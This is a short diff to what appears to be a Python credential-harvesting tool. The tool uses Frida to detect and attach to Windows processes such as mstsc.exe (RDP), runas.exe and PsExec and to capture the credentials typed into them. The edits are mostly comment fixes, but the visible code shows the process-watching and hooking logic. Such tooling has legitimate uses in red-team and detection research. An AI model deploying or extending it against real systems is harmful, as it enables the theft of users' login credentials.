@@ -170,7 +170,7 @@ def MobaXterm():
 
 def WaitForRDP():
     while True:
-        # Trying to find if rdp is running if so, execute the "RDP" function.
+        # Trying to find if mstsc.exe is running if so, execute the "RDP" function.
         if (get_process_by_name("mstsc.exe") and not lockRDP.locked()):
             lockRDP.acquire()
             print("[+] Found RDP Window")
@@ -187,9 +187,7 @@ def WaitForRDP():
 
 
 def RDP():
-    # Explorer is always running so no while loop is needed.
-
-    # Attaching to the explorer process
+    # Attaching to the mstsc.exe process
     print("[+] Trying To Attach To RDP")
     session = frida.attach("mstsc.exe")
     print("[+]Attached To RDP!")
@@ -223,7 +221,6 @@ def RDP():
 	});
 
 	""")
-    # If we found the user and pass then execute "on_message_credui" function
     script.on('message', on_message_rdp)
     script.load()
 
@@ -278,7 +275,7 @@ def WaitForRunAs():
             RunAs()
             sleep(0.5)
 
-        # If the user regret and hey ctrl+c from runas then release the thread lock and start over.
+        # If the user regret and they ctrl+c from runas then release the thread lock and start over.
         elif get_process_by_name("runas.exe") is None and lockRunas.locked():
             lockRunas.release()
             print("[+] Runas is dead releasing lock")
@@ -321,7 +318,7 @@ def RunAs():
 
 
 def WaitForPsExec():
-    # Different variants for PsExec process..
+    # Different variants for PsExec process.
     PsExecList = ["PsExec64.exe", "PsExec.exe", "psexec.exe"]
     while True:
         # Catch the right process name
